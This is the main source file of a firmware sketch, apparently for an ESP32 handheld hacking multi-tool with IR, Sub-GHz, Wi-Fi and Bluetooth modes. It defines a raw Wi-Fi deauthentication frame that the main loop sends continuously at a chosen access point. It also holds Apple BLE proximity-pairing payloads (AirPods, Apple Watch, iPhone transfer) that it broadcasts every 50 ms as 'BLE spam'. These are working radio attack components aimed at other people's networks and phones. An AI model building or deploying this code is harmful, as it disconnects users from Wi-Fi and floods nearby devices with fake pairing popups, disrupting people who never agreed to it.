#include "globals.h"
#include "ui.h"
#include "ir.h"
#include "subghz.h"
#include "wifi_tools.h"
#include "deauth.h"
#include "ble_spam.h"
#include "about.h"

// ── Global definitions ────────────────────────────────────────
TFT_eSPI  tft     = TFT_eSPI();
IRsend    irsend(IR_TX_PIN);
IRrecv    irrecv(IR_RX_PIN);
RCSwitch  rc      = RCSwitch();
NimBLEAdvertising* bleAdv = nullptr;

unsigned long lastCapturedCode  = 0;
unsigned int  lastCapturedBits  = 0;
unsigned int  lastCapturedProto = 0;
decode_results irResults;

Screen   currentScreen = MENU_MAIN;
uint16_t tx = 0, ty = 0;

unsigned long lastBreath = 0;
int  breathVal = 60;
bool breathUp  = true;

APTarget targets[20];
int  targetCount    = 0;
int  selectedTarget = -1;
bool deauthing      = false;

uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

const uint8_t applePayloads[][17] = {
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x0e,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x02,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x09,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12}
};
const char* payloadNames[] = {
  "AirPods", "AirPods Pro", "Apple Watch", "iPhone Xfer"
};
int  currentPayload = 0;
bool bleSpamActive  = false;

// ─────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);

  tft.init();
  tft.setRotation(0);
  tft.fillScreen(COL_BG);

  drawBootScreen();

  irsend.begin();
  irrecv.setUnknownThreshold(12);
  SPI.begin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CS);
  WiFi.mode(WIFI_STA);
  initBLE();
  pinMode(BTN_BOOT, INPUT_PULLUP);

  drawMainMenu();
}

void loop() {
  handleTouch();
  breathingEffect();

  // Boot button = safe return to main menu
  if (digitalRead(BTN_BOOT) == LOW) {
    delay(200);
    deauthing     = false;
    bleSpamActive = false;
    if (bleAdv) bleAdv->stop();
    goToScreen(MENU_MAIN, drawMainMenu);
  }

  if (deauthing && selectedTarget >= 0)
    sendDeauth(selectedTarget);

  if (bleSpamActive) {
    sendAppleAdvert(currentPayload);
    delay(50);
  }
}
